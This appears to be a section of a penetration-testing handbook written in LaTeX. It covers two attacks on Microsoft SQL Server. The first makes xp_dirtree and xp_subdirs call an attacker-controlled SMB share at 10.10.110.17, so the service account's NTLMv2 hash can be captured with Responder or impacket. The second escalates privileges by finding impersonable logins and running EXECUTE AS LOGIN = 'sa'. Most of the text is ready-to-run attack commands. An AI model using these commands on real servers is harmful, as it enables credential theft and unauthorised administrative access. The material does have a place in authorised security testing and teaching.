\section{Capture MSSQL Service Hash}
MSSQL service account hash can be stolen using \verb+xp_subdirs+ or
\verb+xp_dirtree+ undocumented stored procedures, which use the SMB protocol to
retrieve a list of child directories under a specified parent directory from
the file system. NTLMv2 hash can be grabbed either by
responder~\ref{tool:responder} or impacket
smbserver~\ref{tool:impacket:smbserver}.

\begin{verbatim}
master..xp_dirtree
master..xp_fileexist
master..xp_subdirs
sys.dm_os_file_exists
fn_trace_gettable
fn_get_audit_file
\end{verbatim}


\begin{verbatim}
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
\end{verbatim}



\subsection{User impersonation}
MSSQL Server has a special permission, named \verb+IMPERSONATE+, that allows
the executing user to take on the permissions of another user or login until
the context is reset or the session ends.

First, identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned.
\begin{verbatim}
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
\end{verbatim}

Verify if current user has the sysadmin role:

\begin{verbatim}
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go
\end{verbatim}

Impersonating the SA User

\begin{verbatim}
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
\end{verbatim}

It's recommended to run \verb+EXECUTE AS LOGIN+ within the master DB 
(\verb+USE master+), because
all users, by default, have access to that database. If a user you are trying
to impersonate doesn't have access to the DB you are connecting to it will
present an error. 

To revert the operation and return to our previous user, we can use the
Transact-SQL statement \verb+REVERT+.
